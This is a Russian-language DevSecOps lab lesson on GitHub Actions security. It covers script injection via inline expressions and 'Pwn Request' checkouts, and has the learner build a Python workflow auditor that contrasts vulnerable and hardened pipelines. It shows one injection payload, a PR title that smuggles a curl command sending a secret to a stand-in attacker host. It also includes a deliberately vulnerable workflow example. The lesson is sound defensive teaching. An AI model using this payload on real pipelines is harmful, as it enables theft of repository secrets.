## Перед началом: Безопасность CI/CD пайплайнов — `Pwn Request` и инъекция выражений `${{ ... }}` в `GitHub Actions` (`TryHackMe` & `HTB Academy`)

В курсах по безопасности разработки **`TryHackMe` (`DevSecOps` / `Pipeline Security`)** и **`Hack The Box Academy` (`CI/CD Security`)** особое внимание уделяется автоматическим сборочным конвейерам (`GitHub Actions`, `GitLab CI`, `Jenkins`). Почему? Потому что внутри сборочного раннера хранятся самые ценные ключи компании — токены публикации релизов, ключи от облака `AWS/GCP` и `VERCEL_TOKEN`!

Разберём две самые опасные уязвимости в YAML-воркфлоу `GitHub Actions`:
1. **Инъекция команд через контекстные выражения `${{ github.event.pull_request.title }}` прямо внутри блока `run:`**:
   Допустим, автор пайплайна написал шаг проверки заголовка Pull Request:
   ```yaml
   - run: echo "Checking PR: ${{ github.event.pull_request.title }}"
   ```
   В чём ловушка? Движок `GitHub Actions` подставляет текст `${{ ... }}` **до** того, как передать скрипт оболочке `bash` (точно как строковая склейка в SQL-инъекции!). Если внешний участник создаст Pull Request с заголовком:
   `Fix"; curl https://evil.test/?t=$PROD_SECRET #`
   то после подстановки `bash` получит команду:
   `echo "Checking PR: Fix"; curl https://evil.test/?t=$PROD_SECRET #"`
   и выполнит произвольную команду внутри сборочного контейнера!
2. **Уязвимость `Pwn Request` (`pull_request_target` + `actions/checkout` ветки из чужого форка)**:
   - Обычный триггер `on: pull_request` для внешних форков запускается в безопасном режиме: токен `GITHUB_TOKEN` имеет права только на чтение (`read-only`), а секреты репозитория (`secrets.*`) недоступны.
   - Но триггер **`on: pull_request_target`** запускается в контексте базового репозитория **с доступом к секретам и правом записи**! Если внутри воркфлоу с `pull_request_target` сделать явный `actions/checkout` кода из самого PR (`ref: ${{ github.event.pull_request.head.sha }}`) и запустить `npm test` или `make`, то изменённый злоумышленником `package.json` выполнится с полным доступом ко всем секретам репозитория!

## Почему это работает: Как безопасно писать воркфлоу `GitHub Actions`

- **Против инъекций `${{ ... }}` в `run:`**: никогда не вставлять недоверенные поля (`title`, `body`, `head.ref`, `comment.body`) прямо в текст `run:`. Вместо этого передавать их через секцию переменных окружения **`env:`** (`PR_TITLE: ${{ github.event.pull_request.title }}`) и обращаться к ним в `bash` в двойных кавычках как `"$PR_TITLE"` — переменные окружения не парсятся оболочкой как новые команды!
- **Против `Pwn Request`**: никогда не делать `checkout` кода из `pull_request.head.sha` внутри воркфлоу `pull_request_target`, и всегда задавать в начале файла минимальные права токена: `permissions: contents: read`.

<!-- preparation -->

В этом практикуме ты создашь в `lab.py` статический анализатор безопасности YAML-конвейеров `GitHub Actions`, который находит `Pwn Request` (`pull_request_target` + checkout головной ветки PR) и инъекции `${{ ... }}` в `run:`, а затем проверяет безопасный пайплайн с передачей данных через `env:`.

## Сделай сейчас: Проверь воркфлоу `GitHub Actions` на `Pwn Request` и инъекции `${{ ... }}` в `lab.py`

### Шаг 1. Создай файл `lab.py`

Создай скрипт `lab.py`:

```python
def audit_github_workflow(wf):
    issues = []

    if wf.get("trigger") == "pull_request_target" and wf.get("checkout_ref") == "pull_request.head.sha":
        issues.append("CRITICAL:pwn_request_untrusted_checkout_with_secrets")

    if wf.get("permissions") == "write-all":
        issues.append("HIGH:overpermissive_github_token_write_all")

    run_script = wf.get("run_step", "")
    if "${{" in run_script and "github.event." in run_script:
        issues.append("CRITICAL:script_injection_via_inline_expression_in_run")

    return issues if issues else ["HARDENED:safe_workflow_env_bound_and_read_only"]


vuln_workflow = {
    "trigger": "pull_request_target",
    "checkout_ref": "pull_request.head.sha",
    "permissions": "write-all",
    "env": {},
    "run_step": 'echo "PR Title: ${{ github.event.pull_request.title }}"',
}

safe_workflow = {
    "trigger": "pull_request",
    "checkout_ref": "pull_request.head.sha",
    "permissions": "contents:read",
    "env": {"PR_TITLE": "${{ github.event.pull_request.title }}"},
    "run_step": 'printf "PR Title: %s\\n" "$PR_TITLE"',
}

print("vuln_wf_audit=", audit_github_workflow(vuln_workflow))
print("safe_wf_audit=", audit_github_workflow(safe_workflow))
```

### Шаг 2. Запусти программу и сравни оба конвейера

Выполни в терминале:

```bash
python3 lab.py
```

**Ожидаемый результат на экране:**

```text
vuln_wf_audit= ['CRITICAL:pwn_request_untrusted_checkout_with_secrets', 'HIGH:overpermissive_github_token_write_all', 'CRITICAL:script_injection_via_inline_expression_in_run']
safe_wf_audit= ['HARDENED:safe_workflow_env_bound_and_read_only']
```

Разберём, что обнаружил аудитор:
- в `vuln_workflow` выявлены сразу три грубейшие ошибки: сочетание `pull_request_target` с выгрузкой кода из `pull_request.head.sha` (`CRITICAL:pwn_request_untrusted_checkout_with_secrets`), избыточные права `write-all` и прямая вставка `${{ github.event.pull_request.title }}` внутрь строки `run_step` (`CRITICAL:script_injection_via_inline_expression_in_run`);
- в `safe_workflow` используется изолированный триггер `pull_request`, права токена ограничены `contents:read`, а заголовок PR передаётся через переменную окружения `env: PR_TITLE` и безопасно печатается через `printf "%s\n" "$PR_TITLE"`.

### Шаг 3. Проверь существующие воркфлоу в репозитории через `grep` в Kali

В файле `lab.py` измени `permissions` в `safe_workflow` на `"write-all"`, сохрани и запусти `python3 lab.py` — проверка сразу укажет на нарушение принципа минимальных привилегий. После проверки верни `"contents:read"`.

В терминале Kali можно одной командой `grep` проверить любой каталог `.github/workflows` на наличие потенциально опасных триггеров `pull_request_target`:

```bash
grep -rn "pull_request_target" .github/workflows/ 2>/dev/null || echo "no_pull_request_target_found"
```

## Почему это работает: Зачем внешние экшены (`uses: actions/checkout@...`) привязывают к полному 40-символьному SHA-коммиту

Если в воркфлоу написать `uses: third-party/action@v1`, а аккаунт автора этого стороннего экшена взломают, злоумышленник может передвинуть тег `v1` на вредоносный коммит, который украдёт секреты всех репозиториев при следующей сборке! Привязка к неизменяемому 40-символьному хешу коммита (`uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`) гарантирует, что код экшена не изменится без твоего явного ревью.

## Если не получилось: Частые ошибки

- **Использование `echo "$PR_TITLE"` вместо `printf '%s\n' "$PR_TITLE"` для произвольных строк**: если строка в `$PR_TITLE` равна `-n` или `-e \x...`, встроенный `echo` может воспринять её как флаг, тогда как `printf '%s\n' "$PR_TITLE"` всегда выводит строку буквально.
